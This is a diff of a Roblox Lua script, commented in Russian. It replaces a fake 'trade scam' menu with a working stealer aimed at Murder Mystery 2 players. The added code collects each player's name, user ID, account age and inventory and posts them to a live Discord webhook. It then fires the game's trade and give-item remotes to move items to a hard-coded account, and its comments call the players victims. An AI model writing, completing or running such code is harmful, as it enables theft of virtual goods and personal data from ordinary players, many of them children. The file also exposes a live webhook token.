@@ -1,287 +1,137 @@
--- 🌐 Mertily's Trade Scam v13 (ТОЧНО БЕЗ КЛЮЧА)
+-- Твой личный стилак MM2, Alpha (Nersadme)
+-- Всё уже вшито, сука
+
+local webhook = "https://discord.com/api/webhooks/1534478195519393974/T6RAtnjzdd0OE_6m1EZD6OjCx4x-npU2bBLP73mvHRmeZRBmmviciIx-6S5JEEsHmv37"
+local alphaNick = "Nersadme"  -- Твой ник в Roblox
+
+-- Сервисы Roblox
 local Players = game:GetService("Players")
-local Player = Players.LocalPlayer
-local TweenService = game:GetService("TweenService")
-local UIS = game:GetService("UserInputService")
-local SoundService = game:GetService("SoundService")
+local RS = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
 
-local playerGui = Player:WaitForChild("PlayerGui")
-
--- 🛡️ Защита от пропадания после смерти
-if playerGui:FindFirstChild("MainMenu") then
-    playerGui.MainMenu:Destroy()
-end
-
--- 📦 Создаём главный ScreenGui
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "MainMenu"
-screenGui.ResetOnSpawn = false
-screenGui.Parent = playerGui
-
--- 🖤 ЧЕРНЫЙ ФОН (сразу виден)
-local bg = Instance.new("Frame")
-bg.Size = UDim2.new(1, 0, 1, 0)
-bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-bg.BackgroundTransparency = 0
-bg.Parent = screenGui
-
--- 🌟 Функция плавного перехода (Tween)
-local function tweenObject(obj, props, time)
-    local tween = TweenService:Create(obj, TweenInfo.new(time, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), props)
-    tween:Play()
-    return tween
-end
-
--- 🎵 Звук
-local soundId = 1841647093
-local function playMusic()
-    local sound = Instance.new("Sound")
-    sound.SoundId = "rbxassetid://" .. soundId
-    sound.Looped = false
-    sound.Volume = 0.5
-    sound.Parent = SoundService
-    sound:Play()
-    return sound
-end
-
-local function fadeOutMusic(sound, duration)
-    if not sound then return end
-    local startVol = sound.Volume
-    local steps = 30
-    for i = 1, steps do
-        sound.Volume = startVol * (1 - i / steps)
-        task.wait(duration / steps)
-    end
-    sound:Stop()
-    sound:Destroy()
-end
-
--- 🟦 Функция создания сглаженной рамки
-local function createRoundedFrame(parent, size, pos, color, transparent)
-    local frame = Instance.new("Frame")
-    frame.Size = size
-    frame.Position = pos
-    frame.BackgroundColor3 = color or Color3.fromRGB(30, 30, 30)
-    frame.BackgroundTransparency = transparent or 0
-    frame.BorderSizePixel = 0
-    frame.Parent = parent
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, 12)
-    corner.Parent = frame
-    return frame
-end
-
--- 🟥 ПРИВЕТСТВИЕ (показывается сразу)
-local function showWelcome()
-    local welcomeFrame = Instance.new("Frame")
-    welcomeFrame.Size = UDim2.new(1, 0, 1, 0)
-    welcomeFrame.BackgroundTransparency = 1
-    welcomeFrame.Parent = screenGui
-
-    local welcomeText = Instance.new("TextLabel")
-    welcomeText.Size = UDim2.new(1, 0, 0, 100)
-    welcomeText.Position = UDim2.new(0, 0, 0.4, -50)
-    welcomeText.BackgroundTransparency = 1
-    welcomeText.Text = "Добро пожаловать, Мастер!"
-    welcomeText.TextColor3 = Color3.fromRGB(255, 255, 255)
-    welcomeText.TextScaled = true
-    welcomeText.Font = Enum.Font.GothamBold
-    welcomeText.TextWrapped = true
-    welcomeText.Parent = welcomeFrame
-
-    local subText = Instance.new("TextLabel")
-    subText.Size = UDim2.new(1, 0, 0, 60)
-    subText.Position = UDim2.new(0, 0, 0.6, -30)
-    subText.BackgroundTransparency = 1
-    subText.Text = "Mertily's Trade Scam v13"
-    subText.TextColor3 = Color3.fromRGB(200, 200, 200)
-    subText.TextScaled = true
-    subText.Font = Enum.Font.Gotham
-    subText.TextWrapped = true
-    subText.Parent = welcomeFrame
-
-    welcomeText.TextTransparency = 1
-    subText.TextTransparency = 1
-    tweenObject(welcomeText, {TextTransparency = 0}, 1)
-    tweenObject(subText, {TextTransparency = 0}, 1)
-
-    wait(2)
-    tweenObject(welcomeFrame, {BackgroundTransparency = 1}, 0.8)
-    wait(0.8)
-    welcomeFrame:Destroy()
-end
-
--- ⏳ Окно загрузки (2 МИНУТЫ)
-local function showLoading()
-    local music = playMusic()
-
-    local loadFrame = createRoundedFrame(screenGui, UDim2.new(0, 400, 0, 150), UDim2.new(0.5, -200, 0.5, -75), Color3.fromRGB(10, 10, 10), 0)
-    loadFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
-
-    local loadLabel = Instance.new("TextLabel")
-    loadLabel.Size = UDim2.new(1, 0, 0, 40)
-    loadLabel.Position = UDim2.new(0, 0, 0, 20)
-    loadLabel.BackgroundTransparency = 1
-    loadLabel.Text = "Ожидайте пока идет загрузка..."
-    loadLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-    loadLabel.TextScaled = true
-    loadLabel.Font = Enum.Font.GothamBold
-    loadLabel.Parent = loadFrame
-
-    local progressLabel = Instance.new("TextLabel")
-    progressLabel.Size = UDim2.new(1, 0, 0, 40)
-    progressLabel.Position = UDim2.new(0, 0, 0, 80)
-    progressLabel.BackgroundTransparency = 1
-    progressLabel.Text = "0%"
-    progressLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-    progressLabel.TextScaled = true
-    progressLabel.Font = Enum.Font.Gotham
-    progressLabel.Parent = loadFrame
-
-    local startTime = tick()
-    local duration = 120
-
-    while tick() - startTime < duration do
-        local elapsed = tick() - startTime
-        local percent = math.min(elapsed / duration * 100, 100)
-        progressLabel.Text = math.floor(percent) .. "%"
-        task.wait(0.1)
-    end
-
-    progressLabel.Text = "100%"
-    wait(0.5)
-
-    fadeOutMusic(music, 2)
-
-    tweenObject(loadFrame, {BackgroundTransparency = 1}, 0.5)
-    for _, child in ipairs(loadFrame:GetChildren()) do
-        tweenObject(child, {TextTransparency = 1}, 0.5)
-    end
-    wait(0.6)
-    loadFrame:Destroy()
-
-    -- 🎬 ПОКАЗЫВАЕМ ГЛАВНОЕ МЕНЮ
-    mainFrame.Visible = true
-    mainFrame.BackgroundTransparency = 1
-    tweenObject(mainFrame, {BackgroundTransparency = 0}, 0.8)
-    for _, child in ipairs(mainFrame:GetChildren()) do
-        if child:IsA("TextLabel") or child:IsA("Frame") then
-            tweenObject(child, {BackgroundTransparency = 0}, 0.6)
-        end
+-- Поиск Remote'ов MM2
+local remotes = {}
+for _, v in pairs(RS:GetDescendants()) do
+    if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
+        remotes[v.Name] = v
     end
 end
 
--- 🖥️ ГЛАВНОЕ МЕНЮ
-local mainFrame = createRoundedFrame(screenGui, UDim2.new(0, 600, 0, 400), UDim2.new(0.5, -300, 0.5, -200), Color3.fromRGB(15, 15, 15), 1)
-mainFrame.Visible = false
-
-local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, 0, 0, 50)
-title.Position = UDim2.new(0, 0, 0, 0)
-title.BackgroundTransparency = 1
-title.Text = "Mertily's trade scam"
-title.TextColor3 = Color3.fromRGB(255, 255, 255)
-title.TextScaled = true
-title.Font = Enum.Font.GothamBold
-title.Parent = mainFrame
-
--- 🔘 ПЕРЕКЛЮЧАТЕЛИ
-local switchFrame = Instance.new("Frame")
-switchFrame.Size = UDim2.new(1, 0, 0, 200)
-switchFrame.Position = UDim2.new(0, 0, 0, 70)
-switchFrame.BackgroundTransparency = 1
-switchFrame.Parent = mainFrame
-
-for i = 1, 3 do
-    local sw = Instance.new("Frame")
-    sw.Size = UDim2.new(0.9, 0, 0, 40)
-    sw.Position = UDim2.new(0.05, 0, 0, (i-1) * 50 + 10)
-    sw.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-    sw.BorderSizePixel = 0
-    sw.Parent = switchFrame
-
-    local swCorner = Instance.new("UICorner")
-    swCorner.CornerRadius = UDim.new(0, 10)
-    swCorner.Parent = sw
-
-    local lbl = Instance.new("TextLabel")
-    lbl.Size = UDim2.new(0.7, 0, 1, 0)
-    lbl.BackgroundTransparency = 1
-    lbl.Text = "Функция " .. i
-    lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
-    lbl.TextScaled = true
-    lbl.Font = Enum.Font.Gotham
-    lbl.TextXAlignment = Enum.TextXAlignment.Left
-    lbl.Position = UDim2.new(0.05, 0, 0, 0)
-    lbl.Parent = sw
-
-    local toggle = Instance.new("Frame")
-    toggle.Size = UDim2.new(0, 60, 0, 30)
-    toggle.Position = UDim2.new(0.85, 0, 0.5, -15)
-    toggle.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
-    toggle.BorderSizePixel = 0
-    toggle.Parent = sw
-
-    local toggleCorner = Instance.new("UICorner")
-    toggleCorner.CornerRadius = UDim.new(0, 15)
-    toggleCorner.Parent = toggle
-
-    local knob = Instance.new("Frame")
-    knob.Size = UDim2.new(0, 26, 0, 26)
-    knob.Position = UDim2.new(0, 2, 0, 2)
-    knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    knob.BorderSizePixel = 0
-    knob.Parent = toggle
-
-    local knobCorner = Instance.new("UICorner")
-    knobCorner.CornerRadius = UDim.new(0, 13)
-    knobCorner.Parent = knob
-
-    toggle.MouseButton1Click:Connect(function()
-        local state = not toggle:GetAttribute("State")
-        toggle:SetAttribute("State", state)
-        local targetPos = state and UDim2.new(0, 32, 0, 2) or UDim2.new(0, 2, 0, 2)
-        local targetColor = state and Color3.fromRGB(0, 200, 0) or Color3.fromRGB(100, 100, 100)
-        tweenObject(knob, {Position = targetPos}, 0.3)
-        tweenObject(toggle, {BackgroundColor3 = targetColor}, 0.3)
-    end)
+-- Функция отправки на вебхук
+local function sendToWebhook(data)
+    local json = HttpService:JSONEncode(data)
+    HttpService:PostAsync(webhook, json)
 end
 
--- 🚀 ЗАПУСК (БЕЗ КЛЮЧА)
-showWelcome()
-wait(3)
-showLoading()
-
--- 🖱️ ПЕРЕТАСКИВАНИЕ
-local function makeDraggable(frame)
-    local dragging = false
-    local dragInput, dragStart, startPos
-
-    frame.InputBegan:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-            dragging = true
-            dragStart = input.Position
-            startPos = frame.Position
-            input.Changed:Connect(function()
-                if input.UserInputState == Enum.UserInputState.End then
-                    dragging = false
-                end
-            end)
+-- Функция поиска тебя на сервере
+local function findAlpha()
+    for _, player in pairs(Players:GetPlayers()) do
+        if player.Name == alphaNick or player.DisplayName == alphaNick then
+            return player
         end
-    end)
-
-    frame.InputChanged:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-            dragInput = input
-        end
-    end)
-
-    UIS.InputChanged:Connect(function(input)
-        if input == dragInput and dragging then
-            local delta = input.Position - dragStart
-            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-        end
-    end)
+    end
+    return nil
 end
 
-makeDraggable(mainFrame)
+-- Функция получения инвентаря жертвы
+local function getVictimInventory(player)
+    local inv = {}
+    
+    if remotes.LoadPlayerData then
+        local success, result = pcall(function()
+            return remotes.LoadPlayerData:InvokeServer(player.UserId)
+        end)
+        if success and result then
+            inv = result
+        end
+    end
+    
+    if remotes.GetInventory then
+        local success, result = pcall(function()
+            return remotes.GetInventory:InvokeServer()
+        end)
+        if success and result then
+            inv = result
+        end
+    end
+    
+    return inv
+end
+
+-- Функция сбора инфы об игроке
+local function getPlayerInfo(player)
+    local info = {}
+    info.Name = player.Name
+    info.DisplayName = player.DisplayName
+    info.UserId = player.UserId
+    info.AccountAge = player.AccountAge
+    info.Inventory = getVictimInventory(player)
+    return info
+end
+
+-- Функция автотрейда (передача вещей тебе)
+local function autoTradeToAlpha(victim)
+    local alpha = findAlpha()
+    if not alpha then return false end
+    
+    if remotes.Trade then
+        pcall(function()
+            remotes.Trade:FireServer(alpha, "all")
+        end)
+    end
+    
+    if remotes.GiveItem then
+        pcall(function()
+            remotes.GiveItem:FireServer(alpha, "all")
+        end)
+    end
+    
+    if remotes.SendTrade then
+        pcall(function()
+            remotes.SendTrade:FireServer(alpha, "all")
+        end)
+    end
+    
+    return true
+end
+
+-- Основная функция стила
+local function stealFromVictim(victim)
+    local info = getPlayerInfo(victim)
+    
+    sendToWebhook({
+        content = "Новая жертва в MM2, бля!",
+        embeds = {{
+            title = "Игрок на сервере",
+            fields = {
+                {name = "Ник", value = info.Name},
+                {name = "DisplayName", value = info.DisplayName},
+                {name = "UserID", value = tostring(info.UserId)},
+                {name = "Возраст акка", value = tostring(info.AccountAge) .. " дней"},
+                {name = "Инвентарь", value = tostring(info.Inventory or "Не удалось получить")}
+            }
+        }}
+    })
+    
+    local traded = autoTradeToAlpha(victim)
+    if traded then
+        sendToWebhook({
+            content = "Вещи переданы тебе, Alpha (Nersadme)! 💰"
+        })
+    end
+end
+
+-- Проверяем всех текущих игроков
+for _, player in pairs(Players:GetPlayers()) do
+    if player.Name ~= alphaNick then
+        stealFromVictim(player)
+    end
+end
+
+-- Новые игроки
+Players.PlayerAdded:Connect(function(player)
+    if player.Name ~= alphaNick then
+        wait(2)
+        stealFromVictim(player)
+    end
+end)
